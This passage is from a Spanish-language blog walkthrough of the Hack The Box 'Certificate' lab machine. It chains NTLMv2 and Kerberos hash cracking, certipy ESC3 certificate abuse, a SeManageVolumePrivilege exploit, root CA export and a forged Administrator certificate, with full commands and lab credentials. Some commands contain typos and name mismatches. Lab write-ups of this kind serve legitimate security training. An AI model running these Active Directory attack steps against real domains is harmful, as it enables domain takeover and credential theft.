+<p>NTLMv2 Bloof es el resto de la respuesta NTLM en el paquete AUTH.</p>
+</blockquote>
+<p><img alt="Certificate Machine 23" loading="lazy" src="/img/certificate/certificate_machine_23.png"></p>
+<p><img alt="Certificate Machine 24" loading="lazy" src="/img/certificate/certificate_machine_24.png"></p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Domain</th>
+          <th>Server_Challenge</th>
+          <th>NT_proof</th>
+          <th>NTLMv2_bloof</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Administrator</td>
+          <td>WS-01</td>
+          <td>0f18018782d74f81</td>
+          <td>16bytes NTLM response</td>
+          <td>Resto del NTLM response</td>
+      </tr>
+  </tbody>
+</table>
+<pre tabindex="0"><code># Hash
+Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e00630065007200740069006600690063006100740065002e
+</code></pre><p>Y ahora tratamos de crackear el hash NTLMv2 para ver la contraseña de administrador local de la workstation WS-01. <code>&quot;chido&quot;..*7¡Vamos!</code></p>
+<p><img alt="Certificate Machine 25" loading="lazy" src="/img/certificate/certificate_machine_25.png"></p>
+<p>Luego pruebo las credenciales con todos los usuarios del sistema, pero ninguna parece coincidir.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.71 -u users -p password
+</span></span></code></pre></div><p><img alt="Certificate Machine 26" loading="lazy" src="/img/certificate/certificate_machine_26.png"></p>
+<h2 id="kerberos-autentication---krb5roastparser">Kerberos autentication - Krb5RoastParser<a hidden class="anchor" aria-hidden="true" href="#kerberos-autentication---krb5roastparser">#</a></h2>
+<p>Hasta el momento no hemos conseguido nada con los hash NTLMv2 pero sabemos que hay otras formas de autenticación en el sistema.</p>
+<p><a href="https://github.com/jalvarezz13/Krb5RoastParser">Krb5RoastParser Github</a></p>
+<p>Así que usando este repositorio vamos a encontrar paquetes y los hashes de la autenticación mediante kerberos.</p>
+<p>Tenemos tres tipos de hash que podemos encontrar según la opción que indiquemos en el comando:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Hash</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>AS-REQ</td>
+          <td>Pre-Auth Roasting</td>
+      </tr>
+      <tr>
+          <td>AS-REP</td>
+          <td>AS-REP Roasting</td>
+      </tr>
+      <tr>
+          <td>TGS-REP</td>
+          <td>Kerberoasting (Tickets de servicio)</td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python krb5_roast_parser.py ../WS-01_PktMon.pcap as_rep
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python krb5_roast_parser.py ../WS-01_PktMon.pcap tgs_rep
+</span></span></code></pre></div><p><img alt="Certificate Machine 27" loading="lazy" src="/img/certificate/certificate_machine_27.png"></p>
+<p>Y ahora probamos a crackear los diferentes hashes. En este caso en el AS-REP obtenemos las credenciales para el usuario <code>Lion.K:!QAZ2wsx</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">19900</span> as_req_hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><p><img alt="Certificate Machine 28" loading="lazy" src="/img/certificate/certificate_machine_28.png"></p>
+<p>Comprobamos las credenciales y encontramos la user flag en el escritorio del usuario Lion.K</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.71 -u Lion.SK -p <span class="s1">&#39;!QAZ2wsx&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">evil-winrm -i 10.10.11.71 -u Lion.SK -p <span class="s1">&#39;!QAZ2wsx&#39;</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 29" loading="lazy" src="/img/certificate/certificate_machine_29.png"></p>
+<h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Haciendo uso de <code>bloodhound-python</code>, recogemos toda la información disponible en el dominio para luego con <code>BloodhoundCE</code> analizarlo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u Lion.SK -p <span class="s1">&#39;!QAZ2wsx&#39;</span> -d certificate.htb -ns 10.10.11.71 -c all --zip
+</span></span></code></pre></div><p><img alt="Certificate Machine 30" loading="lazy" src="/img/certificate/certificate_machine_30.png"></p>
+<p>Vemos que pertenece a varios grupos aunque nos interesa el grupo <code>DOMAIN CRA MANAGERS</code>, el cual tiene que ver con <code>AD CS</code>.</p>
+<blockquote>
+<p>The members of this security group are responsible for issuing and revoking multiple certificates for the domain users</p>
+</blockquote>
+<p>Entonces vamos a tratar con <code>certipy</code> buscar plantillas de certificados vulnerables, pero antes vamos a solicitar un TGT (Ticket Garanting Ticket) para autenticar-nos a través de kerberos con el usuario Lion y a configurar nuestro archivo <code>krb5.conf</code>.</p>
+<p><img alt="Certificate Machine 31" loading="lazy" src="/img/certificate/certificate_machine_31.png"></p>
+<h2 id="esc3-enrollment-agent-certificate-template">ESC3: <strong>Enrollment Agent Certificate Template</strong><a hidden class="anchor" aria-hidden="true" href="#esc3-enrollment-agent-certificate-template">#</a></h2>
+<p>Ahora haciendo uso de certipy buscamos plantillas vulnerables con <code>-vulnerable</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -k -dc-host DC01.certificate.htb -vulnerable -stdout
+</span></span></code></pre></div><p><img alt="Certificate Machine 32" loading="lazy" src="/img/certificate/certificate_machine_32.png"></p>
+<p>Vemos que la plantilla de certificados <code>Delegated-CRA</code>, es vulnerable a ESC3. Y que además tiene el Enrollment Agent <code>True</code>.</p>
+<p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template">Esc3 Enrollment Agent Template</a></p>
+<p>Pero para conseguir llegar a cabo este vector de ataque, necesitamos otro <code>Template</code> que sea de <code>Client Authentication</code> y que este <code>habilitado</code>.</p>
+<p>Si volvemos a tirar el <code>certipy</code> pero esta vez sin el comando -vulnerable. Vemos todas las plantillas disponibles, y enumerando-las manualmente vemos que el <code>Template SignedUser</code> es vulnerable a <code>ESC3</code>  ya que esta habilitado y tiene el <code>Client Authentication: True</code>, además nos encontramos con el siguiente mensaje:</p>
+<blockquote>
+<p>This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy</p>
+</blockquote>
+<p>Y como nosotros tenemos la otra plantilla vulnerable a <code>Enrollment Agent</code>, podemos llevar a cabo el ataque <code>ESC3</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -k -dc-host DC01.certificate.htb -stdout
+</span></span></code></pre></div><p><img alt="Certificate Machine 33" loading="lazy" src="/img/certificate/certificate_machine_33.png"></p>
+<p>Entonces empezamos el ataque solicitando un certificado de Enrollment Agent para nuestro usuario actual con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -k -dc-host DC01.certificate.htb -ca Certificate-LTD-CA -template DELEGATED-CRA
+</span></span></code></pre></div><p><img alt="Certificate Machine 34" loading="lazy" src="/img/certificate/certificate_machine_34.png"></p>
+<p>Una vez con el certificado para nuestro usuario vamos a solicitar otro <code>impersonando</code> al usuario Ryan.K, ya que cuando lo intentabamos con Administrator no nos ha sido posible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -k -dc-host DC01.certificate.htb -template SignedUser -pfc lion.sk.pfx -on-behalf-of <span class="s1">&#39;certificate\ryan.k&#39;</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 35" loading="lazy" src="/img/certificate/certificate_machine_35.png"></p>
+<p>Y vemos que esta vez hemos podido obtener el archivo <code>.pfx</code> de <code>ryan.k</code> . Con lo cual, el siguiente paso es solicitar un TGT de Kerberos con <code>certipy auth</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx <span class="s1">&#39;ryan.k.pfx -dc-ip &#39;</span>10.10.11.71<span class="err">&#39;</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 36" loading="lazy" src="/img/certificate/certificate_machine_36.png"></p>
+<p>Procedo a comprobar las credenciales:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb certificate.htb --use-kcache
+</span></span></code></pre></div><p><img alt="Certificate Machine 37" loading="lazy" src="/img/certificate/certificate_machine_37.png"></p>
+<h2 id="enumerando-permisos-del-grupo-domain-storage-managers">Enumerando permisos del grupo Domain Storage Managers.<a hidden class="anchor" aria-hidden="true" href="#enumerando-permisos-del-grupo-domain-storage-managers">#</a></h2>
+<p>Ahora si volvemos a mirar el bloodhound del usuario Ryan.K, vemos que pertenece a un grupo interesante llamado <code>Domain Storage Managers</code>.</p>
+<blockquote>
+<p>The members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.</p>
+</blockquote>
+<p><img alt="Certificate Machine 38" loading="lazy" src="/img/certificate/certificate_machine_38.png"></p>
+<p>Iniciamos una shell como el usuario ryan.k haciendo uso de <code>evil-winrm</code> y del hash obtenido anteriormente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
+</span></span></code></pre></div><p><img alt="Certificate Machine 39" loading="lazy" src="/img/certificate/certificate_machine_39.png"></p>
+<h3 id="explotando-el-privilegio-semanagevolume">Explotando el privilegio SeManageVolume<a hidden class="anchor" aria-hidden="true" href="#explotando-el-privilegio-semanagevolume">#</a></h3>
+<p>Si miramos los permisos con el siguiente comando, observamos que tenemos el privilegio <code>SeManageVolumePrivilege</code> que permite ejecutar operaciones directas sobre volúmenes, incluyendo leer sectores en bruto del disco.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 40" loading="lazy" src="/img/certificate/certificate_machine_40.png"></p>
+<p>Buscando por internet, encuentro un exploit para aprovechar el permiso <code>SeManageVolumePrivilege</code> .</p>
+<p><a href="https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html">HTB PivotAPI more</a></p>
+<p><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumeAbuse Github</a></p>
+<p>Entonces lo subimos compilado a la maquina victima usando la utilidad <code>upload</code> de evil-winrm.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">SeManageVolumeExploit</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>Y ahora ejecutamos el <code>.exe</code> y vemos que todo funciona correctamente.</p>
+<p><img alt="Certificate Machine 41" loading="lazy" src="/img/certificate/certificate_machine_41.png"></p>
+<h2 id="enumerar-y-exportar-certificados-de-ryank---certutil">Enumerar y exportar certificados de ryan.k - Certutil<a hidden class="anchor" aria-hidden="true" href="#enumerar-y-exportar-certificados-de-ryank---certutil">#</a></h2>
+<p>Y si ahora miramos los certificados de nuestro usuario con <code>certutil</code> , vemos que tenemos varios certificados interesantes como <code>Root Certification Authority</code>.</p>
+<blockquote>
+<p>La <code>Root Certification Authority</code> (<code>CA Raíz</code>) es la máxima autoridad de confianza en una jerarquía <code>Public Key Infrastructure</code> (<code>PKI</code>), y con la cual podemos exportar un archivo <code>.pfx</code> que nos permitirá generar un certificado para Administrador.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-Store</span> <span class="n">My</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 42" loading="lazy" src="/img/certificate/certificate_machine_42.png"></p>
+<p>Entonces, el siguiente paso es con <code>certutil</code> exportar el certificado a un archivo <code>.pfx</code>  usando la opción <code>-exportPFX</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-exportPFX</span> <span class="n">My</span> <span class="n">75b2f4bbf31f108945147b466131bdca</span> <span class="n">rootcert</span><span class="p">.</span><span class="py">pfx</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 43" loading="lazy" src="/img/certificate/certificate_machine_43.png"></p>
+<p>En el caso de que intentemos exportar el certificado sin haber ejecutado el exploit anterior nos dará el siguiente error:</p>
+<p><img alt="Certificate Machine 44" loading="lazy" src="/img/certificate/certificate_machine_44.png"></p>
+<p>Y esto ocurre ya que no tenemos la capacidad de acceder a la clave privada ya que no se encuentra en nuestro almacén personal, sino en algún otro lugar del sistema al que no podemos acceder con un usuario no privilegiado.</p>
+<p>Ahora con el certificado ya en nuestro poder, nos lo descargamos a nuestra máquina atacante:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">download</span> <span class="n">cert</span><span class="p">.</span><span class="py">pfx</span>
+</span></span></code></pre></div><h2 id="solicitar-certificado-de-administrador---certipy-forge">Solicitar certificado de Administrador - Certipy Forge<a hidden class="anchor" aria-hidden="true" href="#solicitar-certificado-de-administrador---certipy-forge">#</a></h2>
+<p>Ahora con la opción <code>Forge</code> de Certipy, vamos a crear un certificado <code>.pfx</code> como administrador haciendo uso de la <code>Root CA</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy forge -ca-pfx cert.pfx -upn Administrator@certificate.hbt -sid &lt;sid&gt;
+</span></span></code></pre></div><p><img alt="Certificate Machine 45" loading="lazy" src="/img/certificate/certificate_machine_45.png"></p>
+<p>Ahora con <code>certipy auth</code> solicitamos un <code>TGT</code> y obtenemos el HASH de Administrator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx <span class="s1">&#39;administrator_forged.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.71&#39;</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 46" loading="lazy" src="/img/certificate/certificate_machine_46.png"></p>
+<p>Y ahora haciendo PassTheHash iniciamos sesión como administrador en el dominio a través de Evil-Winrm.</p>
+<p><img alt="Certificate Machine 47" loading="lazy" src="/img/certificate/certificate_machine_47.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/certificate/">Certificate</a></li>
+      <li><a href="https://borhuub.github.io/tags/hard/">Hard</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/zip-slip/">Zip Slip</a></li>
+      <li><a href="https://borhuub.github.io/tags/zip-concatenation/">Zip Concatenation</a></li>
+      <li><a href="https://borhuub.github.io/tags/mysql/">Mysql</a></li>
+      <li><a href="https://borhuub.github.io/tags/wireshark/">Wireshark</a></li>
+      <li><a href="https://borhuub.github.io/tags/krb5roastparser/">Krb5RoastParser</a></li>
+      <li><a href="https://borhuub.github.io/tags/esc3/">ESC3</a></li>
+      <li><a href="https://borhuub.github.io/tags/semanagevolume/">SeManageVolume</a></li>
+      <li><a href="https://borhuub.github.io/tags/certutil/">Certutil</a></li>
+      <li><a href="https://borhuub.github.io/tags/certipy-forge/">Certipy Forge</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/administrator/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Administrator</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/fluffy/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Fluffy</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
